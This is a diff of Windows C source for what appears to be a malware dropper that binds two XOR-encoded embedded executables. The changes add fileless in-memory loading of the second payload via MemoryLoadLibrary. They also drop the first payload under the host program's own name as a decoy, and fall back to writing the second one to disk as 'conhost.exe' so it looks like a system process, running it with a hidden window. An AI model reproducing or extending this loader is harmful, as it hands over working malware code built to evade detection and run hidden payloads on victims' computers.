@@ -1,6 +1,7 @@
 
 #include <windows.h>
 #include <stdio.h>
+#include "memory_module.h"
 #include "res1.h"
 #include "res2.h"
 
@@ -12,6 +13,23 @@
 
 #define KEY1 RES_1111_KEY
 #define KEY2 RES_2222_KEY
+
+int load_without_file(u_char* data, size_t size){
+    int result = 0;
+    HMEMORYMODULE handle = MemoryLoadLibrary(data, size);
+    if (handle == NULL)
+    {
+        // printf("Can't load library from memory.\n");
+        return -1;
+    }
+
+    result = MemoryCallEntryPoint(handle);
+    if (result < 0) {
+        // printf("Could not execute entry point: %d\n", result);
+    }
+    MemoryFreeLibrary(handle);
+    return result;
+}
 
 
 char* write_resource(u_char* data, const char* name, DWORD dwSize){
@@ -62,6 +80,9 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      LPSTR    lpCmdLine,
                      int       nCmdShow)
 {
+    char szapipath[MAX_PATH] = {0};
+    char szExe[MAX_PATH] = {0};
+    char* pbuf = NULL;
 
     for(int i = 0; i < RESLEN1; i++){
         RES1[i] = RES1[i] ^ KEY1;
@@ -71,10 +92,18 @@ int APIENTRY WinMain(HINSTANCE hInstance,
         RES2[i] = RES2[i] ^ KEY2;
     }
 
-    char* res1_path = write_resource(RES1, "res1.exe", RESLEN1);
-    char* res2_path = write_resource(RES2, "res2.exe", RESLEN2);
+    //获取应用程序目录
+    GetModuleFileNameA(NULL,szapipath,MAX_PATH);
 
-    // MessageBoxA(NULL, wrp, "提示", MB_OK);
+    //获取应用程序名称
+    char* szLine = strtok_s(szapipath, "\\", &pbuf);
+    while (NULL != szLine)
+    {
+        strcpy_s(szExe, szLine);
+        szLine = strtok_s(NULL, "\\", &pbuf);
+    }
+
+    char* res1_path = write_resource(RES1, szExe, RESLEN1);
     if (res1_path){
         STARTUPINFO si = {sizeof(si)};
         PROCESS_INFORMATION pi;
@@ -92,8 +121,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
             NULL,   // 使用本进程的驱动器和目录
             &si,
             &pi);
-        if(bRet)
-        {
+        if(bRet){
             // 不使用的句柄最好关掉
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
@@ -101,30 +129,33 @@ int APIENTRY WinMain(HINSTANCE hInstance,
         }
     }
 
-    if (res2_path){
-        // MessageBoxA(NULL, "res2 start!", "提示", MB_OK);
-        STARTUPINFO si2 = {sizeof(si2)};
-        PROCESS_INFORMATION pi2;
-        si2.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-        si2.wShowWindow = SW_HIDE;
+    // MessageBoxA(NULL, "bu luodi jiazai res2!", "提示", MB_OK);
+    if (load_without_file(RES2, RESLEN2) < 0){
+        // MessageBoxA(NULL, "luodi jiazai res2!", "提示", MB_OK);
+        char* res2_path = write_resource(RES2, "conhost.exe", RESLEN2);
+        if (res2_path){
+            STARTUPINFO si2 = {sizeof(si2)};
+            PROCESS_INFORMATION pi2;
+            si2.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+            si2.wShowWindow = SW_HIDE;
 
-        BOOL bRet2 = CreateProcess (
-            NULL,       // 不在此指定可执行文件的文件名
-            res2_path,  // 命令行参数
-            NULL,   // 默认进程安全性
-            NULL,   // 默认进程安全性
-            FALSE,  // 指定当前进程内句柄不可以被子进程继承
-            NULL,   // 为新进程创建一个新的控制台窗口
-            NULL,   // 使用本进程的环境变量
-            NULL,   // 使用本进程的驱动器和目录
-            &si2,
-            &pi2);
-        if(bRet2)
-        {
-            // 不使用的句柄最好关掉
-            CloseHandle(pi2.hThread);
-            CloseHandle(pi2.hProcess);
-            // printf("[+] sub process id: %d\n", pi.dwProcessId);
+            BOOL bRet2 = CreateProcess (
+                NULL,       // 不在此指定可执行文件的文件名
+                res2_path,  // 命令行参数
+                NULL,   // 默认进程安全性
+                NULL,   // 默认进程安全性
+                FALSE,  // 指定当前进程内句柄不可以被子进程继承
+                NULL,   // 为新进程创建一个新的控制台窗口
+                NULL,   // 使用本进程的环境变量
+                NULL,   // 使用本进程的驱动器和目录
+                &si2,
+                &pi2);
+            if(bRet2){
+                // 不使用的句柄最好关掉
+                CloseHandle(pi2.hThread);
+                CloseHandle(pi2.hProcess);
+                // printf("[+] sub process id: %d\n", pi.dwProcessId);
+            }
         }
     }
     return 0;
